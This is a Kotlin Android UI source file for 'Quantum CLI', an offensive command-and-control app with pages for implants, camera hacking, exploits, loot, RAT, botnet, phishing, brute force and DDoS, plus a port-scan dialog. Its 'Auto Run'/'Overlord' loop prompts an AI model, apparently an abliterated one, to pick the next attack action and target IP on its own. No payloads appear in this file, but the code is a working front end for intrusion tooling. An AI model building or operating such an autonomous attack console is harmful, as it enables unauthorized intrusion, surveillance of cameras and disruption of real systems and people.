package com.projectzerodays.quantumcli.ui

import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.outlined.AttachFile
import androidx.compose.material.icons.outlined.Build
import androidx.compose.material.icons.outlined.CheckCircle
import androidx.compose.material.icons.outlined.ChatBubble
import androidx.compose.material.icons.outlined.Close
import androidx.compose.material.icons.outlined.Code
import androidx.compose.material.icons.outlined.ContentCopy
import androidx.compose.material.icons.outlined.Dashboard
import androidx.compose.material.icons.outlined.Delete
import androidx.compose.material.icons.outlined.Download
import androidx.compose.material.icons.outlined.Image
import androidx.compose.material.icons.outlined.Lock
import androidx.compose.material.icons.outlined.Menu
import androidx.compose.material.icons.outlined.MenuBook
import androidx.compose.material.icons.outlined.PlayArrow
import androidx.compose.material.icons.outlined.Refresh
import androidx.compose.material.icons.outlined.Send
import androidx.compose.material.icons.outlined.Star
import androidx.compose.material.icons.outlined.Stop
import androidx.compose.material.icons.outlined.Visibility
import androidx.compose.material.icons.outlined.Videocam
import androidx.compose.material.icons.outlined.Wifi
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.DropdownMenuItem
import androidx.compose.material3.DropdownMenu
import androidx.compose.material3.DrawerValue
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.ExposedDropdownMenuBox
import androidx.compose.material3.FilledTonalButton
import androidx.compose.material3.FloatingActionButton
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.ModalDrawerSheet
import androidx.compose.material3.ModalNavigationDrawer
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.RadioButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Slider
import androidx.compose.material3.Surface
import androidx.compose.material3.Switch
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.material3.rememberDrawerState
import androidx.compose.runtime.Composable
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.runtime.staticCompositionLocalOf
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalClipboardManager
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.AnnotatedString
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.projectzerodays.quantumcli.QuantumApp
import com.projectzerodays.quantumcli.ai.AgentDef
import com.projectzerodays.quantumcli.ai.AgentStore
import com.projectzerodays.quantumcli.ai.AiClient
import com.projectzerodays.quantumcli.ai.AiModelDownloader
import com.projectzerodays.quantumcli.ai.ChatController
import com.projectzerodays.quantumcli.ai.IntentParser
import com.projectzerodays.quantumcli.ai.Providers
import com.projectzerodays.quantumcli.ai.SkillDef
import com.projectzerodays.quantumcli.ai.SkillStore
import com.projectzerodays.quantumcli.ai.WorkflowDef
import com.projectzerodays.quantumcli.ai.WorkflowRunner
import com.projectzerodays.quantumcli.ai.WorkflowStep
import com.projectzerodays.quantumcli.ai.WorkflowStore
import com.projectzerodays.quantumcli.c2.AuditEvent
import com.projectzerodays.quantumcli.c2.CameraHit
import com.projectzerodays.quantumcli.c2.C2State
import com.projectzerodays.quantumcli.c2.Grayfish
import com.projectzerodays.quantumcli.c2.MitreMapper
import com.projectzerodays.quantumcli.c2.QcliApi
import com.projectzerodays.quantumcli.c2.QuantServerManager
import com.projectzerodays.quantumcli.c2.UpdateChecker
import com.projectzerodays.quantumcli.data.QuantSettings
import com.projectzerodays.quantumcli.ops.CamWar
import com.projectzerodays.quantumcli.ops.ExploitDb
import com.projectzerodays.quantumcli.ops.Net
import com.projectzerodays.quantumcli.ops.NetDiag
import com.projectzerodays.quantumcli.ops.NseScripts
import com.projectzerodays.quantumcli.ops.Overlord
import com.projectzerodays.quantumcli.ops.ProjectZeroFeed
import com.projectzerodays.quantumcli.ops.ZenScan
import com.projectzerodays.quantumcli.ops.Weapons
import com.projectzerodays.quantumcli.selfhealing.FeatureRegistry
import com.projectzerodays.quantumcli.widgetengine.WidgetGrid
import com.projectzerodays.quantumcli.widgetengine.components.JobCard
import com.projectzerodays.quantumcli.widgetengine.components.JobCardState
import com.projectzerodays.quantumcli.widgetengine.components.JobPhase
import com.projectzerodays.quantumcli.ui.theme.Cyan
import com.projectzerodays.quantumcli.ui.theme.Danger
import com.projectzerodays.quantumcli.ui.theme.Muted
import com.projectzerodays.quantumcli.ui.theme.Ok
import com.projectzerodays.quantumcli.ui.theme.Panel
import com.projectzerodays.quantumcli.ui.theme.PanelBright
import com.projectzerodays.quantumcli.ui.theme.QuantumBg0
import com.projectzerodays.quantumcli.ui.theme.QuantumBg1
import com.projectzerodays.quantumcli.ui.theme.QuantumTypography
import com.projectzerodays.quantumcli.ui.theme.SoftCyan
import com.projectzerodays.quantumcli.ui.theme.Softest
import com.projectzerodays.quantumcli.ui.theme.Warn
import com.projectzerodays.quantumcli.ui.theme.quantumBackground
import com.projectzerodays.quantumcli.ui.theme.quantumPanel
import com.projectzerodays.quantumcli.ops.CamPreview
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import android.graphics.Bitmap
import androidx.compose.foundation.Image
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.window.Dialog
import androidx.compose.ui.window.DialogProperties
import java.io.File

// ---------------------------------------------------------------------------
// Shared helpers
// ---------------------------------------------------------------------------

/** Command dispatcher shared by every manual control — 1:1 with the /ai API. */
private val c2Api = QcliApi()

/**
 * AI readiness — the single gate behind Chat, the chat FAB and Auto Run.
 * Ready means: online mode with a non-blank key, or local mode with a
 * downloaded on-device model. Deterministic mode never unlocks Auto Run.
 */
object AiGate {
    fun ready(): Boolean {
        val s = QuantSettings.state.value
        return when (s.aiMode) {
            AiClient.MODE_ONLINE -> Providers.resolve(s).key.isNotBlank()
            AiClient.MODE_LOCAL -> AiClient.localAvailable()
            else -> false
        }
    }

    fun modeLabel(): String {
        val s = QuantSettings.state.value
        return when (s.aiMode) {
            AiClient.MODE_ONLINE ->
                if (Providers.resolve(s).key.isNotBlank()) {
                    "online (${Providers.byId(s.aiProvider).label.lowercase()})"
                } else {
                    "online — KEY MISSING"
                }
            AiClient.MODE_LOCAL -> if (AiClient.localAvailable()) "local (on-device)" else "local — MODEL MISSING"
            else -> "manual (no AI)"
        }
    }
}

/**
 * Auto Run — the user-facing handle for the Overlord decision loop.
 * Deliberately refused while no AI brain is configured (chat intents can
 * still start the deterministic loop explicitly in No-AI mode).
 */
object AutoRun {
    fun start(cameraOnly: Boolean, intervalSec: Int): Boolean {
        if (!AiGate.ready()) {
            C2State.audit(
                "AI",
                "Auto Run refused — finish Setup first (Abliteration.ai key or local fallback model)"
            )
            return false
        }
        val s = QuantSettings.state.value
        Overlord.start(
            QuantumApp.appScope,
            cameraOnly,
            intervalSec,
            s.overlordAggression,
            s.overlordCycles,
            s.overlordScope.ifBlank { null },
        ) { aiDecide() }
        return true
    }

    private suspend fun aiDecide(): String? {
        val s = QuantSettings.state.value
        val prompt = "Choose the next action. Reply as strict JSON " +
            "{\"action\":\"...\",\"target\":\"ip-or-blank\",\"reason\":\"one sentence\"}. " +
            "Allowed actions: " + Overlord.ACTIONS.joinToString(",") + ". " +
            "State: cameras=" + C2State.cameras.value.size +
            ", implants=" + C2State.implants.value.size +
            ", killswitch=" + C2State.killswitch.value + "."
        return when (s.aiMode) {
            AiClient.MODE_ONLINE ->
                AiClient.onlineChat(listOf("system" to AiClient.SYSTEM_PROMPT, "user" to prompt))
            AiClient.MODE_LOCAL ->
                AiClient.localChat(AiClient.SYSTEM_PROMPT + "\n\n" + prompt)
            else -> null
        }
    }
}

/** Run a manual control off the UI thread; outcome lands in the audit console. */
private fun ioOp(tag: String, block: () -> Any?) {
    QuantumApp.appScope.launch(Dispatchers.IO) {
        try {
            val r = block()
            C2State.audit(tag, (r?.toString() ?: "done").take(400))
        } catch (e: Exception) {
            C2State.audit("ERR", "$tag failed: ${e.message}")
        }
    }
}

/** Cross-page navigation + dialog handles provided via CompositionLocal. */
class UiActions(
    val navigate: (Page) -> Unit = {},
    val openWizard: () -> Unit = {},
    val openManual: () -> Unit = {},
    val onChatAction: (IntentParser.ChatAction) -> Unit = {},
)

val LocalUiActions = staticCompositionLocalOf { UiActions() }

private fun openUrl(ctx: android.content.Context, url: String) {
    try {
        ctx.startActivity(
            android.content.Intent(android.content.Intent.ACTION_VIEW, android.net.Uri.parse(url))
        )
    } catch (e: Exception) {
        C2State.audit("UI", "no app can open $url")
    }
}

// ---------------------------------------------------------------------------
// Dashboard scan dialog — real ZenScan wired to the dashboard SCAN NET button
// ---------------------------------------------------------------------------

@Composable
private fun ScanNetDialog(
    initialTarget: String,
    initialPorts: String,
    initialTiming: Int,
    onDismiss: () -> Unit,
    onResults: (List<ZenScan.HostResult>) -> Unit,
) {
    var target by rememberSaveable { mutableStateOf(initialTarget) }
    var ports by rememberSaveable { mutableStateOf(initialPorts) }
    var timing by rememberSaveable { mutableStateOf(initialTiming) }
    var busy by remember { mutableStateOf(false) }
    var results by remember { mutableStateOf<List<ZenScan.HostResult>>(emptyList()) }

    Column(
        Modifier.verticalScroll(rememberScrollState()),
    ) {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Target CIDR or host") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        OutlinedTextField(
            value = ports,
            onValueChange = { ports = it },
            label = { Text("Ports (22,80,443,1000-2000)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text("Timing:", style = QuantumTypography.bodySmall, color = Muted)
            Spacer(Modifier.width(8.dp))
            (0..5).forEach { t ->
                OutlinedButton(
                    onClick = { timing = t },
                    enabled = !busy,
                    modifier = Modifier.weight(1f),
                ) { Text(ZenScan.timingLabel(t), fontSize = 9.sp) }
            }
        }
        Spacer(Modifier.height(8.dp))
        if (busy) {
            LinearProgressIndicator(Modifier.fillMaxWidth())
            Spacer(Modifier.height(8.dp))
        }
        Button(
            onClick = {
                busy = true
                results = emptyList()
                QuantumApp.appScope.launch {
                    val r = withContext(Dispatchers.IO) {
                        ZenScan.scan(
                            Net.cidrHosts(target),
                            ZenScan.parsePorts(ports),
                            timing,
                        )
                    }
                    results = r
                    busy = false
                    onResults(r)
                }
            },
            enabled = !busy && target.isNotBlank() && ports.isNotBlank(),
            modifier = Modifier.fillMaxWidth(),
        ) { Text(if (busy) "SCANNING…" else "START SCAN") }
        if (results.isNotEmpty()) {
            Spacer(Modifier.height(8.dp))
            Text(
                "${results.size} host(s) found",
                style = QuantumTypography.labelMedium,
                color = Ok,
            )
            results.forEach { r ->
                Text(
                    "${r.ip}  ports: ${r.openPorts.joinToString(",")}",
                    style = QuantumTypography.bodySmall,
                    color = SoftCyan,
                )
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Root — toggleable drawer + scaffold + top bar + overlays
// ---------------------------------------------------------------------------

/**
 * Root composable: a hamburger-toggleable sidebar (8 page destinations,
 * App Manual, Setup wizard, project links), a top bar with menu + chat
 * buttons, the page host body and the floating chat overlay. First open
 * auto-launches the Setup wizard and the local-AI fallback download.
 */
@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun QuantumUi() {
    val scope = rememberCoroutineScope()
    val ctx = LocalContext.current
    val drawerState = rememberDrawerState(initialValue = DrawerValue.Open)
    var selectedPage by rememberSaveable { mutableStateOf(Page.DASHBOARD) }
    var showChat by rememberSaveable { mutableStateOf(false) }
    var showWizard by rememberSaveable { mutableStateOf(false) }
    var showManual by rememberSaveable { mutableStateOf(false) }
    var showC2Gate by rememberSaveable { mutableStateOf(false) }
    var showRemoteDialog by remember { mutableStateOf(false) }

    val settings by QuantSettings.state.collectAsState()
    val dlActive by AiModelDownloader.downloading.collectAsState()
    val aiReady = remember(
        settings.aiMode, settings.apiKey, settings.aiApiKey, settings.aiProvider, dlActive,
    ) { AiGate.ready() }

    // First open: step-by-step setup + local AI fallback auto-download.
    LaunchedEffect(Unit) {
        if (!QuantSettings.state.value.wizardDone) showWizard = true
        runCatching { AiModelDownloader.maybeAutoDownload() }
            .onFailure { C2State.audit("ERR", "startup model check failed: ${it.message}") }
    }

    // C2 destination gate — shown once on first launch (before the main dashboard)
    // so the operator chooses between self-hosting the embedded C2 or connecting
    // to a remote one. Default after the countdown is Self-Host.
    LaunchedEffect(Unit) {
        if (!QuantSettings.state.value.c2DestinationGateShown) {
            showC2Gate = true
        }
    }

    // Dashboard chat FAB -> open the floating chat overlay (or the wizard
    // when no AI brain is configured yet).
    LaunchedEffect(Unit) {
        UiBus.chatOpenRequest.collect {
            if (AiGate.ready()) showChat = true else showWizard = true
        }
    }

    val uiActions = UiActions(
        navigate = { selectedPage = it },
        openWizard = { showWizard = true },
        openManual = { showManual = true },
        onChatAction = { a ->
            when (a) {
                is IntentParser.ChatAction.OpenPage -> selectedPage = a.page
                is IntentParser.ChatAction.StartCameraScan -> {
                    UiBus.cameraScanRequest.value = a.cidr
                    selectedPage = Page.CAMERAS
                }
                is IntentParser.ChatAction.StartOverlord ->
                    AutoRun.start(a.cameraOnly, settings.overlordIntervalSec)
                is IntentParser.ChatAction.StopOverlord -> Overlord.stop()
                is IntentParser.ChatAction.ArmKillswitch ->
                    if (a.arm) C2State.killAll(true) else C2State.disarmKillswitch()
                is IntentParser.ChatAction.RunAiCommand -> Unit // dispatched in ChatController
            }
        },
    )

    CompositionLocalProvider(LocalUiActions provides uiActions) {
        ModalNavigationDrawer(
            drawerState = drawerState,
            drawerContent = {
                ModalDrawerSheet(
                    modifier = Modifier.width(280.dp).background(Panel),
                ) {
                    DrawerContent(
                        selected = selectedPage,
                        onNavigate = { selectedPage = it },
                        aiReady = aiReady,
                        onOpenWizard = { showWizard = true },
                        onOpenManual = { showManual = true },
                        ctx = ctx,
                    )
                }
            },
        ) {
            Scaffold(
                containerColor = Color.Transparent,
                topBar = {
                    TopAppBar(
                        title = {
                            Text(
                                selectedPage.title,
                                style = QuantumTypography.titleMedium,
                                color = Softest,
                            )
                        },
                        colors = TopAppBarDefaults.topAppBarColors(containerColor = Color.Transparent),
                        navigationIcon = {
                            IconButton(onClick = {
                                scope.launch {
                                    if (drawerState.isClosed) drawerState.open() else drawerState.close()
                                }
                            }) {
                                Icon(Icons.Outlined.Menu, contentDescription = "Toggle menu", tint = Cyan)
                            }
                        },
                        actions = {
                            if (aiReady) {
                                IconButton(onClick = { showChat = !showChat }) {
                                    Icon(
                                        Icons.Outlined.ChatBubble,
                                        contentDescription = "Chat",
                                        tint = if (showChat) Cyan else SoftCyan,
                                    )
                                }
                            }
                        },
                    )
                },
            ) { innerPadding ->
                Box(Modifier.fillMaxSize().padding(innerPadding)) {
                    when (selectedPage) {
                        Page.DASHBOARD -> DashboardPage()
                        Page.IMPLANTS -> ImplantsPage()
                        Page.CAMERAS -> CamerasPage()
                        Page.NETWORK -> NetworkPage()
                        Page.EXPLOITS -> ExploitsPage()
                        Page.LOOT -> LootPage()
                        Page.CHAT -> ChatPage()
                        Page.AGENTS -> AgentsPage()
                        Page.SKILLS -> SkillsPage()
                        Page.TASKS -> TasksPage()
                        Page.ML -> MachineLearningPage()
                        Page.DEVICES -> DevicesPage()
                        Page.HONEYPOT -> HoneypotPage()
                        Page.RAT -> RatPage()
                        Page.DORK -> DorkPage()
                        Page.OSINT -> OsintPage()
                        Page.WDEFENSE -> WifiDefensePage()
                        Page.BLE -> BleReconPage()
                        Page.BOTNET -> BotnetPage()
                        Page.PHISH -> PhishPage()
                        Page.BRUTE -> BrutePage()
                        Page.DDOS -> DdosPage()
                        Page.TERMINAL -> TerminalPage()
                        Page.SETTINGS -> SettingsPage()
                    }

                    if (showChat && aiReady) {
                        ChatOverlay(
                            modifier = Modifier
                                .align(Alignment.BottomEnd)
                                .fillMaxWidth(0.95f)
                                .height(470.dp),
                            onClose = { showChat = false },
                            onAction = uiActions.onChatAction,
                        )
                    }

                    // ---- floating chat bubble — popup AI from any page ----
                    if (aiReady && !showChat && selectedPage != Page.CHAT) {
                        FloatingActionButton(
                            onClick = { showChat = true },
                            modifier = Modifier
                                .align(Alignment.BottomEnd)
                                .padding(16.dp),
                            containerColor = Cyan.copy(alpha = 0.25f),
                            contentColor = Cyan,
                        ) {
                            Icon(
                                Icons.Outlined.ChatBubble,
                                contentDescription = "Open floating AI chat",
                            )
                        }
                    }
                }
            }
        }
    }

    if (showWizard) SetupWizard(onDismiss = { showWizard = false })
    if (showManual) ManualDialog(onDismiss = { showManual = false })
    if (showC2Gate) {
        C2DestinationGate(
            onSelfHost = {
                QuantSettings.update {
                    it.copy(c2Mode = "self_host", c2DestinationGateShown = true)
                }
                showC2Gate = false
                // Self-host: ensure the embedded C2 server is running so the
                // native dashboard reflects the same state as the web /dash panel.
                val port = QuantSettings.state.value.c2Port
                if (!QuantServerManager.running.value) {
                    scope.launch(Dispatchers.IO) {
                        val ok = QuantServerManager.start(port)
                        if (ok) {
                            C2State.audit("C2", "self-host C2 auto-started on :$port")
                        } else {
                            C2State.audit("ERR", "self-host C2 auto-start failed on :$port")
                        }
                    }
                }
                selectedPage = Page.DASHBOARD
            },
            onRemoteConnect = {
                showC2Gate = false
                showRemoteDialog = true
            },
            onSkip = {
                QuantSettings.update {
                    it.copy(c2DestinationGateShown = true)
                }
                showC2Gate = false
                selectedPage = Page.DASHBOARD
            },
        )
    }
    if (showRemoteDialog) {
        RemoteConnectDialog(
            initialHost = settings.c2RemoteHost,
            onDismiss = { showRemoteDialog = false },
            onConnect = { host ->
                QuantSettings.update {
                    it.copy(
                        c2Mode = "remote_connect",
                        c2RemoteHost = host.trim(),
                        c2DestinationGateShown = true,
                    )
                }
                showRemoteDialog = false
                C2State.audit(
                    "C2",
                    "remote-connect C2 configured for $host — open /dash on that host for the web panel"
                )
                // Open the remote web dashboard in a browser so the operator can
                // see the web C2 panel alongside the native dashboard controls.
                val url = buildString {
                    append(host.trim().removeSuffix("/"))
                    append("/dash")
                }
                openUrl(ctx, url)
                selectedPage = Page.DASHBOARD
            },
        )
    }
}

// ---------------------------------------------------------------------------
// Sidebar
// ---------------------------------------------------------------------------

@Composable
private fun DrawerContent(
    selected: Page,
    onNavigate: (Page) -> Unit,
    aiReady: Boolean,
    onOpenWizard: () -> Unit,
    onOpenManual: () -> Unit,
    ctx: android.content.Context,
) {
    val dl by AiModelDownloader.downloading.collectAsState()
    val progress by AiModelDownloader.progress.collectAsState()

    val links = listOf(
        Triple("Star on GitHub", Icons.Outlined.Star, "https://github.com/projectzerodays/Quantum-CLI"),
        Triple("Report a Bug", Icons.Outlined.ChatBubble, "https://github.com/projectzerodays/Quantum-CLI/issues"),
        Triple("Contribute", Icons.Outlined.ChatBubble, "https://github.com/projectzerodays/Quantum-CLI/pulls"),
        Triple("Wiki", Icons.Outlined.ChatBubble, "https://github.com/projectzerodays/Quantum-CLI/wiki"),
    )

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState()),
    ) {
        Spacer(Modifier.height(16.dp))
        Text(
            "QUANTUM CLI",
            style = QuantumTypography.headlineSmall,
            color = Cyan,
            modifier = Modifier.padding(horizontal = 20.dp, vertical = 8.dp),
        )
        Spacer(Modifier.height(4.dp))

        Page.entries.forEach { p ->
            val locked = p == Page.CHAT && !aiReady
            NavRow(
                icon = p.icon,
                label = if (locked) "Chat (setup required)" else p.title,
                selected = p == selected,
                locked = locked,
                onClick = { if (locked) onOpenWizard() else onNavigate(p) },
            )
        }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 8.dp))

        NavRow(
            icon = Icons.Outlined.MenuBook,
            label = "App manual",
            selected = false,
            onClick = onOpenManual,
        )
        NavRow(
            icon = Icons.Outlined.Build,
            label = "Setup wizard",
            selected = false,
            onClick = onOpenWizard,
        )

        if (dl) {
            Text(
                "downloading local model… ${(progress * 100).toInt()}%",
                style = QuantumTypography.labelSmall,
                color = Muted,
                modifier = Modifier.padding(horizontal = 20.dp, vertical = 6.dp),
            )
        }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 8.dp))
        Text(
            "Project Links",
            style = QuantumTypography.labelSmall,
            color = Muted,
            modifier = Modifier.padding(horizontal = 20.dp, vertical = 6.dp),
        )
        links.forEach { (label, icon, url) ->
            LinkRow(label, icon, url, ctx)
        }
        Spacer(Modifier.height(4.dp))
        LinkRow(
            "GitHub",
            Icons.Outlined.Code,
            "https://github.com/ProjectZeroDays/Quantum-CLI",
            ctx,
        )
        Spacer(Modifier.height(16.dp))
    }
}

@Composable
private fun NavRow(
    icon: ImageVector,
    label: String,
    selected: Boolean,
    locked: Boolean = false,
    onClick: () -> Unit,
) {
    val bg = if (selected) Brush.horizontalGradient(listOf(Cyan.copy(0.12f), Color.Transparent))
    else Brush.horizontalGradient(listOf(Color.Transparent, Color.Transparent))
    val tint = when {
        locked -> Muted
        selected -> Cyan
        else -> SoftCyan
    }
    Row(
        Modifier
            .fillMaxWidth()
            .background(bg)
            .clickable(onClick = onClick)
            .padding(horizontal = 16.dp, vertical = 12.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Icon(
            imageVector = if (locked) Icons.Outlined.Lock else icon,
            contentDescription = label,
            tint = tint,
            modifier = Modifier.size(22.dp),
        )
        Spacer(Modifier.width(14.dp))
        Text(
            label,
            style = QuantumTypography.bodyLarge,
            color = if (locked) Muted else if (selected) Cyan else Softest,
        )
    }
}

@Composable
private fun LinkRow(label: String, icon: ImageVector, url: String, ctx: android.content.Context) {
    Row(
        Modifier
            .fillMaxWidth()
            .clickable { openUrl(ctx, url) }
            .padding(horizontal = 16.dp, vertical = 10.dp),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        Icon(
            imageVector = icon,
            contentDescription = label,
            tint = SoftCyan,
            modifier = Modifier.size(18.dp),
        )
        Spacer(Modifier.width(12.dp))
        Text(
            label,
            style = QuantumTypography.bodyMedium,
            color = Softest,
            fontSize = 13.sp,
            textAlign = TextAlign.Start,
        )
    }
}

// ---------------------------------------------------------------------------
// Setup wizard (step-by-step: cloud key · local fallback model · skip)
// ---------------------------------------------------------------------------

@Composable
fun SetupWizard(onDismiss: () -> Unit) {
    val settings by QuantSettings.state.collectAsState()
    var step by rememberSaveable { mutableStateOf(0) } // 0 choose · 1 online · 2 local
    var apiUrl by rememberSaveable { mutableStateOf(settings.apiUrl) }
    var apiKey by rememberSaveable { mutableStateOf(settings.apiKey) }
    var model by rememberSaveable { mutableStateOf(settings.model) }
    val dl by AiModelDownloader.downloading.collectAsState()
    val progress by AiModelDownloader.progress.collectAsState()
    val dlErr by AiModelDownloader.error.collectAsState()
    val localReady = AiClient.localAvailable()

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = {
            Text("QUANTUM-CLI setup", style = QuantumTypography.titleLarge, color = Cyan)
        },
        text = {
            Column(Modifier.verticalScroll(rememberScrollState())) {
                when (step) {
                    0 -> {
                        Text(
                            "Configure an AI brain for Chat and Auto Run — or skip and drive " +
                                "every function manually from the dashboard pages.",
                            style = QuantumTypography.bodyMedium,
                            color = Muted,
                        )
                        Spacer(Modifier.height(12.dp))
                        WizardOption(
                            "1 · Abliteration.ai (cloud)",
                            "Paste your API key — chat and Auto Run use the remote endpoint.",
                        ) { step = 1 }
                        Spacer(Modifier.height(8.dp))
                        WizardOption(
                            "2 · Local model (on-device)",
                            "Auto-downloads the Gemma-2B int4 fallback (~1.4 GB) in the " +
                                "background; fully offline afterwards.",
                        ) {
                            QuantSettings.update {
                                it.copy(
                                    aiMode = AiClient.MODE_LOCAL,
                                    autoDownload = true,
                                )
                            }
                            if (!localReady) AiModelDownloader.start()
                            step = 2
                        }
                        Spacer(Modifier.height(8.dp))
                        WizardOption(
                            "3 · Skip — run everything manually",
                            "No AI. Every dashboard control, the kill switch and all scans " +
                                "stay fully available.",
                        ) {
                            QuantSettings.update {
                                it.copy(aiMode = AiClient.MODE_DETERMINISTIC, wizardDone = true)
                            }
                            onDismiss()
                        }
                    }
                    1 -> {
                        OutlinedTextField(
                            value = apiUrl,
                            onValueChange = { apiUrl = it },
                            label = { Text("API URL") },
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                        )
                        Spacer(Modifier.height(8.dp))
                        OutlinedTextField(
                            value = apiKey,
                            onValueChange = { apiKey = it },
                            label = { Text("Abliteration.ai API key") },
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                        )
                        Spacer(Modifier.height(8.dp))
                        OutlinedTextField(
                            value = model,
                            onValueChange = { model = it },
                            label = { Text("Model") },
                            singleLine = true,
                            modifier = Modifier.fillMaxWidth(),
                        )
                        Text(
                            "Stored encrypted on-device. Never leaves the device except as " +
                                "the Authorization header to the endpoint above.",
                            style = QuantumTypography.labelSmall,
                            color = Muted,
                            modifier = Modifier.padding(top = 8.dp),
                        )
                    }
                    else -> {
                        if (localReady) {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Outlined.CheckCircle, null, tint = Ok)
                                Spacer(Modifier.width(8.dp))
                                Text(
                                    "Model ready: ${AiClient.localModelFile()?.name}",
                                    color = Softest,
                                    style = QuantumTypography.bodyMedium,
                                )
                            }
                            Text(
                                AiClient.localHint(),
                                style = QuantumTypography.labelSmall,
                                color = Muted,
                                modifier = Modifier.padding(top = 6.dp),
                            )
                        } else if (dl) {
                            Text(
                                "Downloading fallback model… ${(progress * 100).toInt()}%",
                                style = QuantumTypography.bodyMedium,
                                color = Softest,
                            )
                            LinearProgressIndicator(
                                progress = { progress },
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .padding(vertical = 8.dp),
                            )
                            Text(
                                "Runs in the background — closing this dialog will not stop it. " +
                                    "Chat and Auto Run unlock the moment the model lands.",
                                style = QuantumTypography.labelSmall,
                                color = Muted,
                            )
                        } else {
                            Text(
                                "Download problem: ${dlErr ?: "not started"}",
                                style = QuantumTypography.bodySmall,
                                color = Danger,
                            )
                            Spacer(Modifier.height(8.dp))
                            Button(onClick = { AiModelDownloader.start() }) {
                                Text("Retry download")
                            }
                        }
                    }
                }
            }
        },
        confirmButton = {
            when (step) {
                1 -> Button(
                    enabled = apiKey.isNotBlank(),
                    onClick = {
                        QuantSettings.update {
                            it.copy(
                                aiMode = AiClient.MODE_ONLINE,
                                apiUrl = apiUrl.trim(),
                                apiKey = apiKey.trim(),
                                model = model.trim(),
                                wizardDone = true,
                            )
                        }
                        C2State.audit("AI", "setup wizard: online mode configured (${model.trim()})")
                        onDismiss()
                    },
                ) { Text("Save & finish") }
                2 -> Button(
                    enabled = localReady,
                    onClick = {
                        QuantSettings.update {
                            it.copy(aiMode = AiClient.MODE_LOCAL, wizardDone = true)
                        }
                        onDismiss()
                    },
                ) { Text("Finish") }
                else -> {}
            }
        },
        dismissButton = {
            if (step == 0) {
                TextButton(onClick = {
                    QuantSettings.update { it.copy(wizardDone = true) }
                    onDismiss()
                }) { Text("Not now") }
            } else {
                TextButton(onClick = { step = 0 }) { Text("Back") }
            }
        },
    )
}

@Composable
private fun WizardOption(title: String, desc: String, onClick: () -> Unit) {
    Column(
        Modifier
            .fillMaxWidth()
            .quantumPanel()
            .clickable(onClick = onClick)
            .padding(12.dp),
    ) {
        Text(title, style = QuantumTypography.titleSmall, color = Cyan)
        Text(desc, style = QuantumTypography.bodySmall, color = Muted)
    }
}

// ---------------------------------------------------------------------------
// Dashboard — manual controls, kill switch, auto run, log console
// ---------------------------------------------------------------------------

@Composable
fun DashboardPage() {
    val implants by C2State.implants.collectAsState()
    val audit by C2State.audit.collectAsState()
    val decisions by C2State.decisions.collectAsState()
    val killswitch by C2State.killswitch.collectAsState()
    val overlordRunning by Overlord.running.collectAsState()
    val serverRunning by QuantServerManager.running.collectAsState()
    val ctx = LocalContext.current
    var showAutoRunDlg by remember { mutableStateOf(false) }
